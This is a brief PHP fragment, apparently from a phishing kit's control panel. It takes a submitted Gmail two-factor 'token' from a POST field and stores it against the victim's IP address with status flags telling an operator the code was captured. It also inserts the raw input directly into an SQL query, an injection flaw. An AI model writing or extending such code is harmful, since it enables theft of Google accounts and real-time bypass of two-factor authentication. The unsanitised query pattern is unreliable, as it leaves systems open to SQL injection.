...
$fatoresgmail = $_POST['fatoresgmail'];
$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', dados_do_email='$fatoresgmail', status='Online no token gmail', statusremote='token Enviado!' WHERE ip='$ip'");
